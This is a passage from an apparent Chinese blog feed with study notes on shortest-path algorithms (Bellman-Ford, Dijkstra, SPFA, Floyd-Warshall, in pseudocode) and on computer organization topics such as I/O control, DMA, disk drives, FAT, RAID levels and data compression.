每对顶点间最短路径问题：对每个顶点求单源最短路径，或采用Floyd-Warshall。 算法设计可能情况分析 最短路径的算法很明显依赖于最优子结构性质：假设当前求出了（u，v）的最短路径p，并且p上有两个中间节点（u’，v’），则u’到v’的最短路径一定是路径p上从u’到v’的路径。即：最短路径的子路径是最短路径。证明采用反证法。 假设你有两个传送门u和v，穿过一个传送门就可以到达另一个传送门的位置，并且从u到v会倒退时间t1,从v到u会前进时间t2，t1&gt;t2。此时你就可以无止境的穿越到过去的任意一个时间点，也就是说从u到v和从v到u均有路径，并且路径权值（从u到v和从v到u穿过传送门所需的时间之和t1+t2）是负数。此时形成了负权环，称其为负权回路（回路上的权值之和为负数，而不一定每条权值均为负数），负权回路上的最短路径是没有意义的，只要不停在u和v两点间穿梭，就可以让权值变为负无穷。但是，假如t2&gt;t1，此时只能任意穿越到未来，也就是说当负权路径存在但不存在负权回路时，不影响最短路径算法的求解。 回路问题：图G=（V，E）的任意一条无环路径至多包含|V|个不同的顶点，以及|V|-1条边。最短路径一定不能包含负权回路，同样也不能包含正权回路：假设最短路径上存在正权回路，则将该回路从路径中移除后，路径权值减小，但仍满足u-&gt;v。数据的记录和操作的实现 通常情况下最短路径的目的不仅在于其路径权值大小，还在于路径自身如何行走。最短路径的记录方法可以联想到链式结构，采用前趋数组p[v]记录到达v的前一个顶点。打印路径时，从v开始逆向打印，直到遇到源点s。 松弛技术：对每个顶点v，均设置一个属性d[v]，在求解过程中描述从源点s到v的最短路径上权值的上界，求解结束后就是最短路径的权值，称为最短路径估计。初始化d[v]全部为正无穷，p[v]全部为nil（空）。d[s]=0（源点到自身的距离为0）。在求最短路径过程中，总是不停使用一种替换策略来寻求更小权值：当迄今为止找到的d[v]（s到v的权值）小于d[u]+w(u,v)时，就应当松弛边（u，v）。因此松弛操作要测试是否可以通过u来更新迄今为止所找到的v的最短路径。每次松弛操作可以减小最短路径估计，并更新前缀p[v]。下面的伪代码给出了对边（u，v）的松弛操作。 1234RELAX(u, v, w) if d[v] &gt; d[u] + w(u,v) then d[v] &lt;- d[u] + w(u,v) p[v] = u 正确性 三角不等式：当最短路径求出后，对任意边(u,v)属于E，有d[v] &lt;= d[u] + w(u,v)。 上界性质：在求解最短路径过程中，对任意顶点v属于V，都有d[v] &gt;= MinPath(s,v)，这里用MinPath(s,v)代表从s到v实际的最短路径。一旦d[v]到达MinPath(s,v)，就不再改变。 无路径性质：若从s到v不存在路径，则d[v] = MinPath(s,v) = 正无穷。 收敛性质：若s ~&gt; u -&gt; v是图G中从s到u和v的最短路径，并且在松弛边（u，v）之前有d[u] = MinPath(s,u)，松弛操作后都有d[v] = MinPath(s,v)。 前趋子图性质：对于所有的v，一旦d[v] = MinPath(s,v)，则前趋子图就是一个以s为根的最短路径树。 单源最短路径Bellman-Ford 经过算法分析可知，松弛操作是求解最短路径的核心。需要解决的是如何通过多次松弛操作得到最短路径。 在算法分析的第一步，得到最短路径问题满足最优子结构，因此整个求解的过程是不断完善的，也就是在已经求解出的d[u]基础上更新更多的结点。因此思路可以按层次或按步骤展开。 Bellman-Ford算法：初始化在算法分析中，伪代码如下 123456789BELLMAN_FORD(G, w, s) INITIALIZE_SINGLE_SOURCE(G,s) for i from 1 to |V(G)|-1: for each edge(u,v) in E(G): RELAX(u, v, w) for each edge(u,v) in E(G): if d[v] &gt; d[u] + w(u,v): return FALSE return TRUE 执行过程：第一行初始化d和p数组，第2~4行，对每条边都进行松弛操作，并重复该过程|V(G)|-1次，结束后即可得最短路径。5~7行，判断得到的最短路径是否满足要求，即判断图中是否存在负权回路，存在则返回false，否则返回true。 在第2~4行的操作中，共对所有边重复松弛了|V|-1次。理解如下：在第一次对所有边 的松弛中，得到了源点到所有最短路径长度为1的点的最短路径，也就是说，如果s~&gt;v的实际最短路径长度仅为一条边，则经过第一次循环的松弛操作，该最短路径就已经确定。第二次循环，在第一次循环已经确定的最短路基础上，可以得到源点到所有最短路径长度为两条边的点的最短路径。算法分析中已经得到，图G=（V，E）的任意无环路径最多只能有|V|-1条边，因此经过|V|-1次循环后，可以得到源点到所有顶点的最短路径。 在第5~7行的操作中，如果发现某条边还可以继续松弛，意味着2~4行求出的最短路径还可以更短，这就违背了算法分析中的收敛性质。因此存在负权环，返回FALSE。 BELLMAN-FORD算法可以求解图中存在负权的情况，对负权环的存在可以报错。 Dijkstra算法 Bellman-Ford算法的时间复杂度为O(VE)，Dijkstra算法可以将时间复杂度提升到O(V^2)，利用二叉最小堆实现优先队列进行维护则可以提升到O((V+E)lgV)，利用斐波那契堆可以将运行时间提升到O(VlgV+E)。 回顾求解最小生成树的Prim算法，在初始化阶段设置了一个集合S’只含任意一个结点，用来标记已在最小生成树中的结点，每次从顶点集合V-S’中取出一个顶点，该顶点满足：在所有V-S’的顶点中，该顶点到S’中的顶点距离最小。重复这个过程|V|-1次就可以得到最小生成树。参照这种思想设计Dijkstra算法。 Bellman-Ford算法可以理解为按层次展开。由Prim算法，推测Dijkstra则是按集合划分的“最短路径子图”（自己乱起的名字），初始状态该子图G’只包含源点s，每个计算周期后，向该集合增加一个结点u，并且源点到这个集合的所有结点的最短路径均已求出。这样重复n-1次后即可求出所有结点的最短路径。 如何实现上述推测：上述操作的可行性，可以通过数学归纳法证明：（1）初始化状态下，s到s的最短路径为nil。（2）假设在第k次操作后，G’中含有k+1个结点，除s外还有k个结点，且s到这k个结点的最短路径已经求出。在第k+1次操作中，如何求出应该加入到G’的下一个结点？考虑到Bellman-Ford算法对所有边的|V|-1次松弛操作，当对所有边进行第一次松弛操作后，就已经求出了到源点s最短路径仅含1条边的点集。因此在Dijkstra算法的第k次操作中，利用加入的第k个结点对剩下的结点中与其直接相连的结点进行松弛操作，就可以得到基于已求出最短路径的前k个结点的最短路径估计。也就是，此时V-G’中的顶点的最短路径估计，都已经完全利用了前k个结点的最短路径（在第i次操作中利用了加入的第i个结点）。因此V-G’中顶点最短路径估计最小的顶点，就是k+1次操作需要加入的结点。 伪代码： 123456789DIJKSTRA(G, w, s) INITIALIZE_SINGLE_SOURCE(G,s) S &lt;- Nil Q &lt;- V[G] while Q != Nil: # Q为剩余未加入G’的顶点，Q=V-G’ u &lt;- EXTRACT-MIN(Q) # 选出Q中最短路径估计最小的顶点，用优先队列维护 S &lt;- S | &#123;u&#125; for each vertex v in Adj[u]: # 与u有直接边相连的顶点 RELAX(u, v, w) 要注意的是，Dijkstra算法的正确性是依赖于：更长的最短路径是从短的最短路径发展而来的，例如s~&gt;v的路径是从s~&gt;u维护出来的，存在的问题在于短的最短路径一旦确定就不能修改。而Dijkstra总是选择当前能连到的V-G’中最近的顶点插入集合G’中，即使用了贪心策略。想象一个图：一共三个顶点1、2、3，1到2距离为3，1到3距离为4，而3到2距离为-2。在Dijkstra算法运算后，1到2、3的距离分别为3和4，而实际上1到2的距离应该为2。尽管在G’中有了1、2后，插入3会重新松弛与3相连的边，但Dijkstra不允许对已经在G’中的结点松弛（如果松弛成功，此前已经确定的最短路径都会发生改变，则算法是错误的）。因此Dijkstra不能处理存在负权边的图。 SPFA 由Bellman-Ford和Dijkstra衍生的Priority Queue-Based Bellman-Ford，国内ACM称为SPFA，与Dijkstra区别在于一个结点能否多次入队。可以处理负权边，适合临接表存储，是Bellman-Ford的优化。又可以看做是BFS的多次入队算法。 Bellman-Ford无论是否已求出最短路径，一定要重复松弛所有边|V|-1次，SPFA将松弛的次数减少。Dijkstra中，一个结点一旦进入了“最短路径子图”就无法再修改其路径和权值，而在SPFA中，并不设置这样一个“写保护”的集合，仅有一个表示最短路径估计的d数组。 算法流程：初始化相同，d[s]=0，设置一个队列，将源点s入队。每次从队中取出一个结点u，并用该结点松弛和其直接相连的所有边，如果发现有一条边（u，v）在松弛操作后更新，则很有可能其它顶点因为d[v]的更新而产生新的最短路径，所以要将v入队。以此循环往复，直到队列为空，整个图没有可以继续松弛的边，则SPFA结束。算法执行时需要设置一个inq数组,inq[v]表示v当前是否在队列中，以防止一个结点在队列中同时出现多次。对于图中存在负权环的情况，可以依据结点入队的次数进行判断。Bellman-Ford对所有边松弛|V|-1次后就能求得最短路径，因此如果某个顶点入队了|V|次，就意味着出现了负权环。 伪代码 1234567891011SPFA(G, w, s) INITIALIZE_SINGLE_SOURCE(G,s) Queue &lt;- s while Queue is not nil: u &lt;- Queue if InQueueCount(u) &gt; V(G): return FALSE for each vertex v in Adj[u]: if RELAX(u, v, w) and not inq[v]: Queue &lt;- v return TRUE 优化Dijkstra算法优化 二叉堆实现的优先队列优化Dijkstra算法每次要从V-G’中选取最短路径估计最短的结点加入G’，因此可以利用优先队列对顶点集V维护，类似Prim的二叉堆维护。可以直接copy最小生成树中Prim的二叉堆部分代码。 斐波那契堆实现的Dijkstra优化 TODO SPFA算法优化 SLF：Small Label First，假设要加入的结点是j，队首元素为i，若d[j]&lt;d[i]则将j插入队首，否则插入队尾。速度可提升15～20%。 LLL：Large Label Last，假设队首元素为i，队列中的所有结点的d平均值为x，若d[i]&gt;x，则将i插入队尾，查找下一元素，直到找到某一个i使得d[i]&lt;=x，则将i出队进行松弛。SLF+LLL可将效率提升约50%。 SPFA效率不稳定，若无负权边，通常采用Dijkstra。 多对顶点间最短路径动态规划求解算法 数据的记录：在单源最短路径中我们采用前缀数组pre[i]记录以i为终点的最短路径上的前一个结点，在多对顶点间最短路径问题中，将此数组延伸为二维数组，用pre[i][j]记录从i到j的最短路径上，j的前趋结点。这时打印路径的方法可以用以下伪代码描述。 1234567PRINT_ALL_PAIRS_SHORTEST_PATH( pre, i, j) if i = j : then print i else if pre[i][j] = Nil: then print \"No path from\" i \"to\" j else PRINT_ALL_PAIRS_SHORTEST_PATH( pre, i, pre[i][j] ) print j 简要描述设计动态规划算法的步骤 描述一个最优解的结构 递归定义一个最优解的值 按自底向上的方式计算一个最优解的值 从计算出的信息中构造出一个最优解 具体分析最短路径问题 最短路径的结构：在单源最短路径中我们已经得到最短路径满足最优子结构，即最短路径的所有子路径也是最短路径。 最短路径问题的状态转移方程：考虑状态转移方程，首先考虑如何通过变量表示整个递推过程，再用类似数学归纳法给出递推过程，通常用“恰好”和“至多”定义某个可递推的变量。对于i、j之间的最短路径，这条最短路径至多包含m条边，用L(i,j,m)表示从i到j，至多包含m条边的任何路径的权值最小值。当m=0时，i = j。因此当i=j时，L(i,j,0) = 0，否则L(i,j,0)=正无穷。对于m非0情况，我们可以发现，至多包含m条边时的最短路径，要么是最多包含m-1条边的最短路径，要么是在m-1条边的最短路径的基础上计算出在m条边下的最短路径（这里用例子说明，假如L(i,j,m)不是L(i,j,m-1)，则一定是走了一条i~&gt;k -&gt; j的路径，根据最优子结构，i~&gt;k的路径一定是最短路径，这在推导m-1时已经得到了，因此i~&gt;k的权值L(i,k,m-1)+w(k,j)就是L(i,j,m)。用递归式表达即L(i,j,m) = min{ L(i,k,m-1) + w(k,j) }, k from 1 to n。这个式子包含了L(i,j,m)=L(i,j,m-1)的情况，因为w(j,j)=0。因为图G=(V,E)的任一最短路径至多只能包含|V|-1条边，因此L(i,j,|V|-1)就是任意i到j的最短路径的权值。 自底向上计算最短路径权值：对于一个给定的临界矩阵W，和一个已经求好的L(k-1)，可以用以下伪代码求出L(k)。 123456789EXTEND_SHORTEST_PATHS(L,W) n &lt;- rows(L) # 顶点数目 let L' be an n×n matrix for i from 1 to n: for j from 1 to n: L'[i][j] = INF for k from 1 to n: L'[i][j] = min( L[i][k] + w(k,j) ) return L' 因此，可以加上一重循环，求出L(m)。时间复杂度O(V^4)。 123456SLOW-ALL-PAIRS-SHORTEST-PATHS(W) n &lt;- rows(W) Let L(1) = W for m from 2 to n-1: L(m) &lt;- EXTEND-SHORTEST-PATHS( L(m-1), W ) return L(m-1) 与矩阵乘法相结合：考虑两个矩阵A和B相乘C = A·B，对与i，j=1,2,…,n，计算c(ij) = Sum( a(ik)·b(kj) , k from 1 to n )，记此式为‘。上面给出的递推公式，作如下替换：l(m-1) -&gt; a，w -&gt; b， l(m) -&gt; c， + -&gt; · ， min -&gt; + ，则得到了式‘。因此，EXTEND_SHORTEST_PATHS(A,B)实际返回的是A·B，因此L(1) = L(0)·W， L(2) = L(1)·W = W^2，…，L(n-1) = L(n-2)·W = W^(n-1)。 改进运行时间：对矩阵的乘方作快速幂运算。改进后的时间复杂度为O(V^3·lgV)。 Floyd-Warshall 同样是动态规划算法，利用了最短路径结构的另一个特点，不同于基于矩阵乘法算法中的特征。Floyd考虑最短路径上的中间结点，对于一条从u到v的简单路径（不含环）p，中间结点是p上除了u和v之外的其他结点。此算法应用广泛，在群论中用于计算传递闭包，图论中还可用于计算最大流。 Floyd-Warshall算法基于以下最优子结构：将G的V个顶点编号为1,2,3,…,V，任意一对顶点(i,j)，考虑从i到j并且所有中间结点都属于集合{1,2,3,…,k}的路径，并设p是这些路径中的最短路径，则可推导出“从i到j并且所有中间结点都属于集合{1,2,3,…,k,k+1}的最短路径p’”。推导过程如下：假设顶点k+1不是路径p’的中间结点，则p’的所有中间结点都在集合{1,2,3,…,k}中，因此p’=p。假设顶点k+1是路径p’的中间结点，则可将p’分解为i~&gt;k+1, k+1~&gt;j，分别记为p1和p2，根据最短路径最优子结构，p1和p2分别是从i到k+1和从k+1到j的最短路径，p1和p2的中间结点均属于{1,2,3,…,k}。 递归解：记D(i,j,k)为上述的p的权值，则k=0时有D(i,j,k) = w(i,j)，k非0时有D(i,j,k) = min{ D(i,j,k-1), d(i,k,k-1) + d(k,j,k-1) }。根据该方程，我们知道D(i,j,k)的值从D(i,j,k-1)推出，因此D(i,j,k-1)必须在D(i,j,k)之前计算。因此将k放在伪代码的最外层循环。伪代码如下。 12345678FLOYD-WARSHALL(W) n &lt;- rows(W) D(0) &lt;- W for k from 1 to n: for i from 1 to n: for j from 1 to n: D(i,j,k) = min ( D(i,j,k-1) , D(i,k,k-1)+D(k,j,k-1) ) return D(n) 代码实现Dijkstra+堆优化SPFA+SLF+LLLFloyd-Warshall 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2015/12/23/Graph-Algorithms5/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"Algorithms","slug":"Algorithms","permalink":"http://forec.github.io/tags/Algorithms/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"计组与体系结构笔记（六）","slug":"Computer-Organization-Architecture6","date":"2015-11-14T08:48:06.000Z","updated":"2016-11-22T11:07:38.000Z","comments":true,"path":"2015/11/14/Computer-Organization-Architecture6/","link":"","permalink":"http://forec.github.io/2015/11/14/Computer-Organization-Architecture6/","excerpt":"输入/输出和存储系统。","text":"输入/输出和存储系统。 AMDAHL定律、输入/输出结构 计算机系统整体性能的速度提升取决于某个特定部件本身的加速率和该部件在系统中的使用率。公式表示为 S = ( (1-f)+f/k )^-1。式中，S为系统整体性能的加速率，f表示较快部件完成的工作部分，k为新部件的加速率。例如，某计算机需要70%时间执行CPU操作和30%时间等待磁盘服务，当前有两种升级方案：10000￥使得处理器价格提高50%，或7000￥使得磁盘处理能力为当前系统的250%。若选择升级处理器，则f = 0.70，k = 1.5，S = 1 / ((1-0.7)+0.7/1.5) = 1.30；若选择升级磁盘，则f = 0.30，k = 2.5，S约为1.22。由此可看出升级处理器带来的整体性能提升更高，但考虑价格因素，对提升的每个百分点，升级CPU需要333￥，而升级磁盘只要318￥。 输入/输出定义为在外部设备和由CPU、主存储器组成的主机系统之间移动编码数据的一个子系统部件。 输入输出子系统包括 用于I/O功能的主存储器模块 提供将数据从系统中移入和移出所需要的总线通道 主机和外围设备中的控制模块 连接外部元件的接口、连接主机系统和外围设备的电缆等 协议：在发送设备和接收设备之间交换的各种信号的具体形式和信号所代表的意义，包括命令信号、状态信号、数据传递信号。接收设备对命令和发送来的数据做出应答的协议交换称为握手。 通常处理大量数据信息的外部设备都有缓冲存储器，如打印机、磁带驱动器等，缓冲器允许主机系统以尽可能快的方式将大量数据发送到外围设备中。设备控制电路负责从系统的缓冲器中提取或输入数据，例如包括在写数据时对磁盘定位，将打印头或激光术移动到下一字符位置，启动打印头，弹出打印纸等操作。 磁盘和磁带属于持久性存储，其相对易失性存储时间更长。数据在磁性介质中可以保存约5年，在光学介质中可保存大约100年。 I/O控制方法 程序控制的I/O：系统为每个I/O设备至少分配一个专用的寄存器，CPU持续不断的监视每个寄存器，等待数据到达，该方法称为轮询。一旦CPU检测到某个“数据就绪”的条件，就为该寄存器准备指令执行等操作。该方法的优点在于：可以通过编程控制每个外部设备的行为，改变程序就可以调整系统所控制的外部设备的数目和类型，以及轮询的权限和时间间隔。缺点在于：不断对寄存器轮询使得CPU持续处于繁忙等待循环中，直到开始服务某个I/O请求。如果没有任何I/O任务要处理，CPU就无法从事任何有用的操作。因此程序控制的I/O最适合用于自动提款机等一些用来控制或监视外部事件的系统。 中断控制的I/O：在有数据发送需求时由外部设备通知CPU，如果没有外部设备发出服务请求来中断CPU，则CPU继续执行其他任务。通常使用CPU的标志寄存器中的一个二进制位表示中断信号，该位称为中断标志。一旦中断标志置位，操作系统就会中断正在执行的程序，并保存该程序的状态和各种可变的信息，提取请求中断的I/O设备的地址矢量。在完成I/O操作后CPU会完全恢复到中断前状态并继续执行。该方法和程序控制I/O的相似之处为：都可以对I/O服务程序进行修改以适应外部硬件的改变。许多主流操作系统均使用中断控制的I/O，为防止病毒制造者修改I/O设备地址矢量指向恶意代码，操作系统均提供了保护机制防止这类操作。 直接存储器存取（DMA）：无论何种中断控制的I/O，CPU都需要从I/O设备移入和移出数据。在这个过程中，CPU会完全运行一些类似如下为代码的指令 123456789101112WHILE More-input AND NOT Error ADD 1 TO Byte-count IF Byte-count &gt; Total-bytes-to-be-transferred THEN EXIT ENDIF Place byte in destination buffer Raise byte-ready signal Initialize timer REPEAT WAIT UNTIL Byte-acknowledged, Timeout, OR ErrorENDWHILE 这些指令非常简单，可以使用一个专用芯片编程。如果一个系统使用DMA，则CPU不再需要执行冗长的I/O指令，仅需为DMA提供需要传输数据字节的地址、字节数以及目标I/O设备地址。CPU和DMA的通信由CPU上的专用I/O寄存器完成。DMA执行I/O操作的具体细节时，CPU会继续执行下一个任务，DMA完成后会发送一个中断请求通知CPU。 程序控制的I/O每次传输一个字节，中断控制的I/O每次可以按字节或小数据块形式传输，具体取决于I/O设备。通常速度较慢的设备如键盘，传输相同字节数的数据要比磁盘驱动器和打印机产生更多的中断过程。DMA方法是面向数据块的I/O处理方式，只在一组字节的传输结束后才中断CPU。当DMA发出I/O完成的信号后，CPU会给出下一个要读取或写入的内存地址，而传输失败时，CPU会独自做出适当的相应，因此DMA的I/O需要很少的CPU参与。 DMA控制器和CPU共享存储器总线，任一时刻只能有一个设备控制总线，通常I/O设备比CPU从内存中提取程序指令和数据的优先级高，因为很多I/O设备操作都限制在紧凑的时间参数内，如果特定的时间周期内没有检测到事件发生，这些I/O设备就会被强制超时休息，并中止当前I/O进程。为避免超时休息，DMA会利用平时由CPU使用的存储器周期完成I/O操作，称为周期窃取。因为I/O趋向于在总线上产生突发式的传输，即成块成组的发送数据，在这些突发式传输的间隙，CPU会被授权访问总线。 通道控制的I/O：DMA适用于小型单用户计算机，对于大型多用户计算机通常采用I/O通道的智能型DMA接口。一个或多个的I/O处理器可以控制多条不同的I/O路径，这些路径被称为通道路径。对于慢速设备如打印机，通道路径可以复用，允许几个这类设备仅通过一个控制器管理。在IBM的大型计算机中，一个多路复用的通道路径称为多路复用器通道，而服务于磁盘控制器和其他快速设备的通道称为选择器通道。I/O通道由一些被称为I/O处理器（IOP）的小CPU控制，IOP具有执行程序的能力，其与DMA的主要区别在于1）I/O处理器的智能特性：能够对协议进行协商，发出各种设备命令，独立于CPU传输，CPU只负责为其创建程序指令、通知其指令所在地址。2）通道控制的I/O系统都配备单独的总线，用来格力主机和I/O操作，IOP只在从主存储器提取指令时才使用系统存储器总线。因此通道控制的I/O通常在高吞吐量的环境中使用。 磁盘技术 磁盘驱动器技术出现前，顺序存储介质如打孔卡片、磁带、纸带等是唯一可用的持久性存储介质。如果某个用户所需的数据写在磁带卷轴的尾部，必须读完整卷才能读取，并且每次只能阅读一个记录。1956年IBM公司发布第一台商用磁盘计算机，简称RAMAC，使用随机访问方法的会计和控制计算机。其使用的磁盘驱动器，每个磁盘直径24英寸，磁盘每一面只能容纳50000个7位字符，售价数百万美元。到2000年，IBM推广的磁盘直径尺寸仅为1英寸，保存1GB字节数据，平均访问时间15ms，价格低于300$。 磁盘驱动器 磁盘驱动器被称为随机存储设备，或直接存储设备。磁盘上的每个存储单元被称为扇区，有独一无二的存取地址。这些扇区按照同心圆环的形式划分为一圈一圈的磁道（每个同心圆环为一个磁道），每个磁道上的扇区数都相同，因此数据在磁盘中心写入的数据比磁盘边缘更加密集。有的厂商会把全部扇区制作为近似相同的容量，这样外部磁道可以放置比内部磁道更多的扇区，存储更多信息，这种方法称为分区位，现在很少被使用，因为需要更复杂的驱动控制电路。磁道从磁盘最外的磁道0开始编号，在一条磁道分布的圆周上，扇区的分配顺序可能不连续，这样允许驱动器电路有时间在读取下一个扇区之前处理完扇区进程的内容，这种技术称为交叉存储技术。现代磁盘驱动器大多一次读取一条磁道，而不是一次读取一个扇区，因此交叉存储技术已经不再流行。 磁盘（hard）包括控制电路和一个或多个金属/玻璃盘片，称为碟片。盘片上镀有一层薄的磁性材料薄膜，碟片堆叠在转轴上，通过一个马达带动磁盘碟片旋转，速度可达每分钟15000rpm，典型的磁盘转速为5400rpm和7200rpm。磁盘的读写头安装在一个旋转的磁盘驱动臂上，磁盘驱动臂通过其转轴上缠绕的线圈的感应磁场来进行准确定位，整个梳状的读写头可以向磁盘中心移动或从磁盘中心移开。对于一个堆叠的磁盘结构，磁盘上的各个磁道上下一一对应，形成一个圆柱面。一组梳状的读写头每次可以访问一个柱面。通常磁盘的可用面上都有一个磁头，但对于一些老式的磁盘系统特别是移动磁盘，最上层碟片的上表面和最下层磁盘的下表面常常都是不用的。磁盘磁头从来都不会触及磁盘的表面，而是悬浮在磁盘表面的上方，之间仅仅相隔几个微米厚的空气层。当磁盘系统断电后，磁头退到一个安全的地方，这一过程称为停靠磁头。如果读写头接触到磁盘表面，就会损坏磁盘，称为磁头撞损。 寻道时间指磁盘驱动臂定位到指定的磁道上所需的时间。寻道时间并不包括磁头读取磁盘目录的时间。磁盘目录将逻辑文件信息如my_story.doc，映射到对应的物理扇区位置，如第7柱面中第3表面的第72扇区。部分高性能的磁盘会在每个可用面的每个磁道上都提供一个读写头，消除了寻道时间。旋转延迟是指读写头定位到指定的扇区所需的时间。旋转延迟和寻道时间的和为存取时间。 在每次执行读写操作前都必须读取磁盘目录，由于磁盘最外层的磁道在相同面积内有最低的位密度，因此与内层磁道相比更不容易出现位错误。为保证更高的可靠性，可以把磁盘目录存放在最外层磁道，即磁道0。因此每次存取操作驱动臂都必须向外摆动到磁道0，然后回到所需数据的磁道上。随着记录技术和纠错算法发展，目前已经允许磁盘目录放到能够提供最佳性能的位置上，即最中间的磁道上。实际情况中，操作系统以群组的形式为扇区分配地址，称为区块。每个块中扇区的数目决定了分配表的大小，如果分配的块越小，则当一个文件不能装满整个块时，浪费的空间就越小；而如果每个块中的扇区数目过少，则记录块的分配表会很大，查找速度会减慢。 ## 软盘 软盘组织方式与硬盘相似，按照磁道和扇区寻址。区别在于软盘的磁性材料涂层附着在一个软性的聚酯塑料基片上，并且由于软盘不能像硬盘一样密封，因此软盘的数据密度和旋转速度受到很大限制。软盘的读写头必须接触到磁盘的磁表面，当读写头上有其他颗粒时，摩擦会引起磁性涂层的磨损，因此必须定期清洗磁头。软盘的组织结构和操作规范更统一。以3.5’’ 1.44MB DOS/Windows软盘为例，每个扇区含512个字节，每条磁道有18个扇区，软盘的每一面有80条磁道。扇区0为软盘的引导扇区，紧接着的是两个完全相同的文件分配表（File Allocation Table，FAT）的副本，标准的1.44MB软盘的每个FAT大小为9个扇区长。每个区块是一个可编址的单元，1.44MB软盘中每个区块即为一个扇区。磁盘根目录占据从扇区19开始的14个扇区，每个根目录的条目占用32字节，每个根目录存储文件名、文件属性、文件时间表、文件大小、存放的起始区块编号，起始的区块编号指向FAT中的某个条目。如果某个数据文件占用多个区块，则允许追踪这个数据文件跨越的扇区链。 FAT是一个简单的表结构，采用位图形式记录磁盘上每个区块的基本信息，指示区块是否处于空闲、保留、数据占用或坏区状态。因为每个1.44MB磁盘包含18×80×2 = 2880个扇区，所以每个FAT条目需要12位用来指出一个区块。实际上每个FAT条目都为16位宽，因此称为FAT16。若一个文件跨越多个区块，则该文件的第一个FAT条目中同样包含一个转向该文件下一个FAT条目的指针。 举例：假设文件占用了从扇区121开始的4个扇区，读取文件时会进行如下操作FAT索引120121122123124125126127FAT内容97124EOF12581261225771.读取磁盘目录查找文件起始区块121,读取第一个区块取回文件第一部分。2.读取位于区块121的FAT条目查找文件剩余部分，表中可得下一数据区块对应的FAT条目为124。3.读取区块124和相应的FAT条目，之处下一数据在126。4.读取区块126和相应的FAT条目，之处下一数据在122。5.读取区块122和对应的FAT，在下一扇区位置找到标志，因此结束。 独立磁盘冗余阵列 1988年美国加州大学伯克利分校的David Patterson、Garth Gibson和Randy Katz三人发表了“廉价磁盘冗余阵列的实例”的论文，创造RAID一词，介绍了如何利用若干数量的廉价小磁盘替代大型机上的大型昂贵的单磁盘。论文中三人定义了5种类型（称为级）的RAID，每一级RAID具有不同的性能和可靠性，后来经过各厂商发展，增加了其他RAID级。更高编号的RAID层次不一定是更好的RAID系统，下面使用的编号方法保留了Berkeley命名方法。 RAID Level 0：简称RAID-0，是将数据以条带形式存放在几个磁盘表面上，一个记录会占用几个磁盘表面的多个扇区，又称为磁盘跨区、块交错数据分带或磁盘分带。分带是简单的将逻辑顺序的数据进行分段，分段可以小到单一位，或某个特定大小的块。因为RAID-0不提供冗余，因此在各种RAID配置结构中，RAID-0有最佳性能，尤其在每个磁盘都有自己的独立控制器和高速缓存时。RAID-0非常廉价，但系统整体可靠性为单个磁盘期望性能的几分之一。如阵列由5个磁盘组成，每个磁盘设计寿命50000小时，则整个系统期望设计寿命50000/5 = 10000 小时。磁盘数增加，失效概率随之增加。没有冗余导致RAID-0没有容错能力，因此RAID-0的唯一好处在于性能，通常用于非关键的而又需要高速读取、写入的数据，或改变不太频繁和经常被分的数据，或低成本场合。 RAID Level 1：称为磁盘镜像，是所有RAID级中失效保护最佳的方案，存储方式和RAID-0相同，但每次写入数据都会复制到另一组完全相同的磁盘上。这种方式的读取性能更优异，尤其在镜像盘（第二组磁盘）和住驱动器相差180度旋转时，减少一半反应时间。RAID-1适合于面向事务、高可用率的工作环境，以及高容错率的应用，如会计、工资表。 RAID Level 2：因为RAID-1方案成本为RAID-0的两倍，因此RAID-2只是用磁盘组中的一个或几个磁盘存储其他磁盘中的数据信息。RAID-2在每个条带中只写入一位数据，而不采用任意大小的块写入数据，这样需要至少八个磁盘表面才能存放数据，另外需要一组磁盘驱动器存放纠错信息，这些纠错位由海明编码生成。如果磁盘阵列中的任何一个驱动器损坏，可以用海明驱动器重建这个驱动器。同样，如果海明驱动器出错，也可以用数据驱动器重建。然而，所有驱动器必须严格同步，并且生成海明编码的过程非常耗时。 RAID Level 3：RAID-3同RAID-2一样，每次按照一位的方式将数据交错分配到各个驱动器的条带中，但与RAID-2不同的是，RAID-3只使用一个驱动器来保存简单的奇偶校验位，只需对每一位进行异或即可。利用这种方法可以对一个损坏的驱动器重建，例如6号驱动器损坏并要被替换，只要对其他7个数据驱动器和奇偶校验器上的数据异或即可。RAID-3需要同步操作，比RAID-1和RAID-2更经济，不适合面向事务的应用程序，更适合读写大块数据块的情况。 RAID Level 4：RAID-4和RAID-2一样，是理论上的RAID级。使用一个奇偶校验位驱动器和一组数据磁盘，将数据写入统一大小的条带中，奇偶校验位也存储为条带。然而RAID-4使系统性能严重下降，因为数据盘对奇偶校验盘有竞争情况。假设正在处理奇偶校验块，如果有一个条带1和条带4的写入请求，在RAID-0和RAID-1时会直接写入，而RAID-4的奇偶校验则成为了瓶颈。 RAID Level 5：RAID-5是所有以RAID为基础的应用系统中使用数量最多的，能够以最少的成本提供最佳的保护，改进了RAID-4，将奇偶校验位写到多个磁盘上而非一个磁盘。但在所有RAID层次中，RAID-5需要的磁盘控制器是最复杂的。图中绿色方块代表奇偶校验位。 RAID Level 6：前面所有的RAID系统只能允许最多有一个磁盘出错，但通常磁盘驱动器出错呈现成簇的倾向（寿命相同，灾难性事件）。RAID-6对每排数据使用两组纠错条带，除使用奇偶校验位外还使用Reed-Soloman纠错编码提供二层保护。RAID-6的写入性能很差，并且生成Reed-Soloman编码需要的代价很大，因此目前没有商业配置的RAID-6系统。 RAID混合系统：如RAID-10，将RAID-0的分带和RAID-1的镜像结合。 数据压缩 压缩系数 = 1 - 压缩后的文件大小/压缩前的文件大小 × 100% 字符的熵：衡量一个消息中的信息量。如果某个符号x在一个消息中出现的概率为P(x)，则该字符的熵H = -P(x)×log(2)P(x)。整个消息的平均熵则为消息中所有n个符号的熵求和取平均。熵为编码一个消息所需的二进制位数建立了低限。除了这个低限外的其他位不会增加信息。例如“Hello World!”中，平均的符号熵为3.022，因此低限为3.022×12个字符 = 36.26或37位，因此如果用8位ASCII编码表示，则冗余位为8×12 - 37 = 59个。 赫夫曼编码 按照消息中不同字符出现的频率构成赫夫曼树，之后按照左分支标记0，右分支标记1的方式编码。这样频率最高的符号在编码中占用最少的位，并产生的是前缀编码。 赫夫曼编码实际将实数集的元素映射为整数子集中的元素，因此精度上的欠缺可能使产生的编码有冗余，不能刚好使用平均熵的位数压缩。 算术编码 